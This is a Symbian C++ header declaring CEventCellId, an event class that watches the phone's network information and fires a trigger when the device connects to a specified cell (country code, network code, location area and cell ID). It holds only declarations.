/*
 ============================================================================
 Name		: EventCellId.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventCellId declaration
 ============================================================================
 */

#ifndef EVENTCellId_H
#define EVENTCellId_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractEvent.h"
#include <HT\Phone.h>
#include <HT\Logging.h>

// CLASS DECLARATION

typedef struct TCellIdStruct
	{
	TUint32 iExitAction;
	TUint32	iMCC;	// Mobile Country Code
	TUint32 iMNC;	// Mobile Network Code
	TUint32	iLAC;	// Location Area Code
	TUint32 iCell;
	} TCellIdStruct;


/**
 *  CEventCellId
 * 
 */
class CEventCellId : public CAbstractEvent, public MPhoneObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventCellId();

	/**
	 * Two-phased constructor.
	 */
	static CEventCellId* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventCellId* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();

private:
	// From MPhoneObserver
	virtual void HandlePhoneEventL(TPhoneFunctions event);

	/**
	 * Checks if the device is currently Connected to the CellID passed by params
	 */
	TBool ConnectedToCellID();

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventCellId(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
private:
	TBool iWasConnectedToCell;
	CPhone* iPhone;
	TCellIdStruct iCellParams;
	CTelephony::TNetworkInfoV1Pckg iNetInfoPckg;
	CTelephony::TNetworkInfoV1 iNetInfo; 			// Network Info
	__FLOG_DECLARATION_MEMBER
	};

#endif // EVENTCellId_H
